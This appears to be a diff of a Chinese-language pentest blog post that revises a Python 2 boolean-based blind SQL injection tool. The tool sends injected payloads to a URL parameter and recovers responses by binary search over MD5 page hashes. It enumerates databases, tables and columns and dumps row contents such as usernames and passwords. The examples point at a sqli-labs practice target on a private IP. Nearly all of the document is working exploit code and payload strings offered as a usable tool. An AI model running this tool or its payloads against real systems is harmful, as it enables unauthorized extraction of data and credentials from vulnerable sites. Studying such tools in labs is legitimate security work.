@@ -75,13 +75,13 @@ topics = ["Pentest"]
 ### 0x04 附上python脚本
 > ```python
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-  
+# -*- coding: utf-8 -*-
+# code by reber <1070018473@qq.com>
 
 __author__="reber"
 
 import sys
-import urllib
-import urllib2
+import requests
 import binascii
 import hashlib
 from pyfiglet import figlet_format
@@ -89,8 +89,7 @@ from optparse import OptionParser
 
 
 def get_md5_html(url):
-    response = urllib2.urlopen(url)
-    html = response.read()
+    html = requests.get(url=url).content
 
     m2 = hashlib.md5()
     m2.update(html)
@@ -98,22 +97,12 @@ def get_md5_html(url):
 
     return md5_html
 
-def getAllDatabases(url):
-	# global aa
-    # print "getAllDatabases"
-    # print url
-    standard_md5 = get_md5_html(url)
-    # print standard_md5
-
-    low = 1
-    high = 100
-    while low <= high:  #循环结束后得到数据库个数
+def get2(*args): #二分法得到数值
+    low,high,url,payload,standard_md5 = args
+    while low <= high:
         mid = (low + high)/2;
 
-        payload = "' and ((select count(distinct+table_schema) from information_schema.tables) > %d)--+" % mid
-        # payload = ("%s" % aa).join(payload.split())
-        payload = "/**/".join(payload.split())
-        mid_url = url + payload
+        mid_url = url + payload.format(mid=mid)
         mid_md5_html = get_md5_html(mid_url)
 
         if standard_md5 == mid_md5_html:
@@ -121,205 +110,99 @@ def getAllDatabases(url):
         else:
             high = mid-1
 
-        db_num = (low+high+1)/2
+        num = (low+high+1)/2
+    return num
+
+def getAllDatabases(url):
+    standard_md5 = get_md5_html(url)
+    # print standard_md5
+
+    payload = "' and ((select count(distinct+table_schema) from information_schema.tables) > {mid})--+"
+    # payload = payload.replace(' ','%20')
+    db_num = get2(1,100,url,payload,standard_md5)
+
     print "The total number of database is: %d" % db_num
     for index in xrange(0,db_num):  #一次循环输出一个数据库名
-        low = 1
-        high = 30
+        payload = "' and (length((select distinct table_schema from information_schema.tables limit {index},1)) > {mid})--+".format(index=index,mid='{mid}')
+        # payload = payload.replace(' ','%20')
 
-        while low <= high:  #循环结束后得到数据库名的长度
-            mid = (low + high)/2
+        db_name_len = get2(1,30,url,payload,standard_md5)
 
-            payload = "' and (length((select distinct table_schema from information_schema.tables limit %d,1)) > %d)--+" % (index,mid)
-            # print payload
-            payload = "/**/".join(payload.split())
-            mid_url = url + payload
-            mid_md5_html = get_md5_html(mid_url)
-
-            if standard_md5 == mid_md5_html:
-                low = mid + 1
-            else:
-                high = mid-1
-
-            db_name_len = (low+high+1)/2
         # print "database name length:%d" % db_name_len
-        print "\tdatabase name is: ",
-        for x in xrange(1,db_name_len+1):   #一次for循环输出数据库名的一个字符
-            low = 32
-            high = 126
-            while low <= high: #循环结束后得到数据库名的一个字符的ASCII码
-                mid = (low + high)/2
-                payload = "' and (select ascii(substr((select distinct table_schema from information_schema.tables limit %d,1), %d, 1)) > %d) --+" % (index,x,mid)
-                # print payload
-                payload = "/**/".join(payload.split())
-                mid_url = url + payload
-                mid_md5_html = get_md5_html(mid_url)
+        print "[*] ",
+        for x in xrange(1,db_name_len+1):   #一次for循环输出数据库名的一个字符            
+            payload = "' and (select ascii(substr((select distinct table_schema from information_schema.tables limit {index},1), {x}, 1)) > {mid}) --+".format(index=index,x=x,mid='{mid}')
+            # payload = payload.replace(' ','%20')
 
-                if standard_md5 == mid_md5_html:
-                    low = mid + 1
-                else:
-                    high = mid-1
+            str_ascii = get2(32,126,url,payload,standard_md5)
 
-                str_ascii = (low+high+1)/2
             database_name_one_str = chr(str_ascii)
+            # print database_name_one_str
             sys.stdout.write(database_name_one_str)
             sys.stdout.flush()
         print
 
 def getAllTablesByDb(url,db_name):
-    # print "getAllTablesByDb"
-    # print url
-    # print db_name
     standard_md5 = get_md5_html(url)
     db_name_hex = "0x" + binascii.b2a_hex(db_name)
     # print standard_md5
 
-    low = 1
-    high = 200
-    while low <= high:  #循环结束后得到表个数
-        mid = (low + high)/2;
+    payload = "' and ((select count(distinct+table_name) from information_schema.tables where table_schema={db_name_hex}) > {mid})--+".format(db_name_hex=db_name_hex,mid='{mid}')
+    # payload = "/**/".join(payload.split())
+    db_num = get2(1,200,url,payload,standard_md5)
 
-        payload = "' and ((select count(distinct+table_name) from information_schema.tables where table_schema=%s) > %d)--+" % (db_name_hex,mid)
-        payload = "/**/".join(payload.split())
-        mid_url = url + payload
-        mid_md5_html = get_md5_html(mid_url)
-
-        if standard_md5 == mid_md5_html:
-            low = mid + 1
-        else:
-            high = mid-1
-
-        db_num = (low+high+1)/2
-
-    print "Database security contains %d table:" % db_num
+    print "Database %s: [%d tables]" % (db_name,db_num)
     for index in xrange(0,db_num):  #一次循环输出一个表名
-        low = 1
-        high = 30
+        payload = "' and (length((select distinct table_name from information_schema.tables where table_schema={db_name_hex} limit {index},1)) > {mid})--+".format(db_name_hex=db_name_hex,index=index,mid='{mid}')
+        payload = "/**/".join(payload.split())
+        table_name_len = get2(1,30,url,payload,standard_md5)
 
-        while low <= high:  #循环结束后得到表名的长度
-            mid = (low + high)/2
-
-            payload = "' and (length((select distinct table_name from information_schema.tables where table_schema=%s limit %d,1)) > %d)--+" % (db_name_hex,index,mid)
-            # print payload
-            payload = "/**/".join(payload.split())
-            mid_url = url + payload
-            mid_md5_html = get_md5_html(mid_url)
-
-            if standard_md5 == mid_md5_html:
-                low = mid + 1
-            else:
-                high = mid-1
-
-            table_name_len = (low+high+1)/2
-        # print db_name_len
-        print "\ttable name is: ",
+        print "[*] ",
         for x in xrange(1,table_name_len+1):   #一次for循环输出表名的一个字符
-            low = 32
-            high = 126
-            while low <= high: #循环结束后得到表名的一个字符的ASCII码
-                mid = (low + high)/2
-                payload = "' and (select ascii(substr((select distinct table_name from information_schema.tables where table_schema=%s limit %d,1), %d, 1)) > %d) --+" % (db_name_hex,index,x,mid)
-                # print payload
-                payload = "/**/".join(payload.split())
-                mid_url = url + payload
-                mid_md5_html = get_md5_html(mid_url)
+            payload = "' and (select ascii(substr((select distinct table_name from information_schema.tables where table_schema={db_name_hex} limit {index},1), {x}, 1)) > {mid}) --+".format(db_name_hex=db_name_hex,index=index,x=x,mid='{mid}')
+            # payload = "/**/".join(payload.split())
+            str_ascii = get2(32,126,url,payload,standard_md5)
 
-                if standard_md5 == mid_md5_html:
-                    low = mid + 1
-                else:
-                    high = mid-1
-
-                str_ascii = (low+high+1)/2
             table_name_one_str = chr(str_ascii)
             sys.stdout.write(table_name_one_str)
             sys.stdout.flush()
         print 
 
 def getAllColumnsByTable(url,table_name,db_name):
-    # print "getAllColumnsByTable"
-    #while循环结束后得到列的个数
     #for循环，一次得到一列的列名：
         #while循环得到列名的长度：
         #for循环，一次得出列名的一个字符
-    # print url
-    # print table_name
-    # print db_name
     standard_md5 = get_md5_html(url)
     table_name_hex = "0x" + binascii.b2a_hex(table_name)
     db_name_hex = "0x" + binascii.b2a_hex(db_name)
     # print standard_md5
 
-    low = 1
-    high = 100
-    while low <= high:  #循环结束后得到列个数
-        mid = (low + high)/2;
+    payload = "' and ((select count(distinct+column_name) from information_schema.columns where table_name={table_name_hex} and table_schema={db_name_hex}) > {mid})--+".format(table_name_hex=table_name_hex,db_name_hex=db_name_hex,mid='{mid}')
+    # payload = "/**/".join(payload.split())
+    column_num = get2(1,200,url,payload,standard_md5)
 
-        payload = "' and ((select count(distinct+column_name) from information_schema.columns where table_name=%s and table_schema=%s) > %d)--+" % (table_name_hex,db_name_hex,mid)
-        # print payload
-        payload = "/**/".join(payload.split())
-        mid_url = url + payload
-        mid_md5_html = get_md5_html(mid_url)
-
-        if standard_md5 == mid_md5_html:
-            low = mid + 1
-        else:
-            high = mid-1
-
-        column_num = (low+high+1)/2
-    print "Table %s contains %d columns:" % (table_name,column_num)
+    print "Table %s: [%d columns]" % (table_name,column_num)
     for index in xrange(0,column_num):  #一次循环输出一个列名
-        low = 1
-        high = 30
+        payload = "' and (length((select distinct column_name from information_schema.columns where table_name={} and table_schema={} limit {},1)) > {})--+".format(table_name_hex,db_name_hex,index,'{mid}')
+        # payload = "/**/".join(payload.split())
+        column_name_len = get2(1,30,url,payload,standard_md5)
 
-        while low <= high:  #循环结束后得到列名的长度
-            mid = (low + high)/2
-
-            payload = "' and (length((select distinct column_name from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) > %d)--+" % (table_name_hex,db_name_hex,index,mid)
-            # print payload
-            payload = "/**/".join(payload.split())
-            mid_url = url + payload
-            mid_md5_html = get_md5_html(mid_url)
-
-            if standard_md5 == mid_md5_html:
-                low = mid + 1
-            else:
-                high = mid-1
-
-            column_name_len = (low+high+1)/2
         # print "column length is: %d" % column_name_len
-        print "\tcolumn name is: ",
+        print "[*] ",
         for x in xrange(1,column_name_len+1):   #一次for循环输出列名的一个字符
-            low = 32
-            high = 126
-            while low <= high: #循环结束后得到列名的一个字符的ASCII码
-                mid = (low + high)/2
-                payload = "' and (select ascii(substr((select distinct column_name from information_schema.columns where table_name=%s and table_schema=%s limit %d,1), %d, 1)) > %d) --+" % (table_name_hex,db_name_hex,index,x,mid)
-                # print payload
-                payload = "/**/".join(payload.split())
-                mid_url = url + payload
-                mid_md5_html = get_md5_html(mid_url)
+            payload = "' and (select ascii(substr((select distinct column_name from information_schema.columns where table_name={} and table_schema={} limit {},1), {}, 1)) > {}) --+".format(table_name_hex,db_name_hex,index,x,'{mid}')
+            # payload = "/**/".join(payload.split())
+            str_ascii = get2(32,126,url,payload,standard_md5)
 
-                if standard_md5 == mid_md5_html:
-                    low = mid + 1
-                else:
-                    high = mid-1
-
-                str_ascii = (low+high+1)/2
             column_name_one_str = chr(str_ascii)
             sys.stdout.write(column_name_one_str)
             sys.stdout.flush()
         print
 
 def getAllcontent(url,column_name,table_name,db_name):
-    # print "getAllcontent"
-    #while循环结束后得到结果的行数
     #for循环，一次得到一行的值
         #while循环得到每个字段的长度
         #for循环，一次得出一个字段的一个字符
-    # print url
-    # print column_name
-    # print table_name
-    # print db_name
     column_name = column_name.split(',')
     len_column_name = len(column_name)
     # print "len_column_name:%d" % len_column_name
@@ -328,23 +211,10 @@ def getAllcontent(url,column_name,table_name,db_name):
     db_name_hex = "0x" + binascii.b2a_hex(db_name)
     # print standard_md5
 
-    low = 1
-    high = 10000
-    while low <= high:  #循环结束后得到列个数
-        mid = (low + high)/2;
+    payload = "' and ((select count(*) from {}.{}) > {})--+".format(db_name,table_name,'{mid}')
+    payload = "/**/".join(payload.split())
+    column_value_num = get2(1,10000,url,payload,standard_md5)
 
-        payload = "' and ((select count(*) from %s.%s) > %d)--+" % (db_name,table_name,mid)
-        # print payload
-        payload = "/**/".join(payload.split())
-        mid_url = url + payload
-        mid_md5_html = get_md5_html(mid_url)
-
-        if standard_md5 == mid_md5_html:
-            low = mid + 1
-        else:
-            high = mid-1
-
-        column_value_num = (low+high+1)/2
     print "The %s table with %d row value: " % (table_name,column_value_num)
     stri = ""
     for x in xrange(0,len_column_name):#输出title
@@ -352,43 +222,16 @@ def getAllcontent(url,column_name,table_name,db_name):
     print stri
     for index in xrange(0,column_value_num):  #一次循环输出一行数据
         for y in xrange(0,len_column_name):  #一次输出一行的一列的值,循环完输出一行的值
-            low = 1
-            high = 30
-            # print "len_column_name:%s" % column_name[y]
-            while low <= high:  #循环结束后得到一行数据的一列值的长度
-                mid = (low + high)/2
+            payload = "' and (length((select {} from {}.{} limit {},1)) > {})--+".format(column_name[y],db_name,table_name,index,'{mid}')
+            # payload = "/**/".join(payload.split())
+            column_value_len = get2(1,30,url,payload,standard_md5)
 
-                payload = "' and (length((select %s from %s.%s limit %d,1)) > %d)--+" % (column_name[y],db_name,table_name,index,mid)
-                # print payload
-                payload = "/**/".join(payload.split())
-                mid_url = url + payload
-                mid_md5_html = get_md5_html(mid_url)
-
-                if standard_md5 == mid_md5_html:
-                    low = mid + 1
-                else:
-                    high = mid-1
-
-                column_value_len = (low+high+1)/2
             # print "column value length is: %d" % column_value_len
-            # print "\tcolumn name is: ",
             for x in xrange(1,column_value_len+1): #得到一行数据的一列的值
-                low = 32
-                high = 126
-                while low <= high: #得到一行数据的一列值的单个字符ASCII码
-                    mid = (low + high)/2
-                    payload = "' and (select ascii(substr((select %s from %s.%s limit %d,1), %d, 1)) > %d) --+" % (column_name[y],db_name,table_name,index,x,mid)
-                    # print payload
-                    payload = "/**/".join(payload.split())
-                    mid_url = url + payload
-                    mid_md5_html = get_md5_html(mid_url)
+                payload = "' and (select ascii(substr((select {} from {}.{} limit {},1), {}, 1)) > {}) --+".format(column_name[y],db_name,table_name,index,x,'{mid}')
+                # payload = "/**/".join(payload.split())
+                str_ascii = get2(32,126,url,payload,standard_md5)
 
-                    if standard_md5 == mid_md5_html:
-                        low = mid + 1
-                    else:
-                        high = mid-1
-
-                    str_ascii = (low+high+1)/2
                 column_name_one_str = chr(str_ascii)
                 sys.stdout.write(column_name_one_str)
                 sys.stdout.flush()
@@ -397,11 +240,11 @@ def getAllcontent(url,column_name,table_name,db_name):
 
 
 def main():
-    print figlet_format("sqli-bool")
-    parser = OptionParser()
+    print figlet_format("sql-bool")
+    parser = OptionParser(usage='Usage: python %prog [options]',version='%prog 1.2')
     parser.add_option("-u","--URL",action="store",
               type="string",dest="url",
-              help="get url")
+              help="target url")
     parser.add_option("-D","--DB",action="store",
               type="string",dest="db_name",
               help="get database name")
@@ -411,25 +254,13 @@ def main():
     parser.add_option("-C","--COL",action="store",
               type="string",dest="column_name",
               help="get column name")
-
     parser.add_option("--dbs",action="store_true",
               dest="dbs",help="get all database name")
-    parser.add_option("--current-db",action="store_true",
-              dest="current_db",help="get current database name")
-    parser.add_option("--current-user",action="store_true",
-              dest="current_user",help="get current user name")
-    parser.add_option("--tables",action="store_true",
-              dest="tables",help="get tables from databases")
-    parser.add_option("--columns",action="store_true",
-              dest="columns",help="get columns from tables")
-    parser.add_option("--dump",action="store_true",
-              dest="dump",help="get value")
     (options,args) = parser.parse_args()
-
 
     if options == None or options.url == None:
         parser.print_help()
-    elif options.dump and options.column_name and options.table_name and options.db_name:
+    elif options.column_name and options.table_name and options.db_name:
         getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
     elif options.table_name and options.db_name:
         getAllColumnsByTable(options.url,options.table_name,options.db_name)
@@ -437,18 +268,14 @@ def main():
         getAllTablesByDb(options.url,options.db_name)    
     elif options.dbs:
         getAllDatabases(options.url)
-    elif options.current_db:
-        getCurrentDb(options.url)
-    elif options.current_user:
-        getCurrentUser(options.url)
     elif options.url:
-        print "you input: sqli-error.py -u %s" % options.url
+        parser.print_help()
 
 
 if __name__ == '__main__':
     main()
-    # getAllDatabases("http://192.168.188.134/sqli/Less-8/?id=1")
-    # getAllTablesByDb("http://192.168.188.134/sqli/Less-8/?id=1","security")
-    # getAllColumnsByTable("http://192.168.188.134/sqli/Less-8/?id=1","user","mysql")
-    # getAllcontent("http://192.168.188.134/sqli/Less-8/?id=1","id,username,password","users","security")
+    #python test.py -u "http://192.168.188.134/sqli/Less-8/?id=1" --dbs
+    #python test.py -u "http://192.168.188.134/sqli/Less-8/?id=1" -D security
+    #python test.py -u "http://192.168.188.134/sqli/Less-8/?id=1" -D security -T users
+    #python test.py -u "http://192.168.188.134/sqli/Less-8/?id=1" -D security -T users -C username,password
 ```
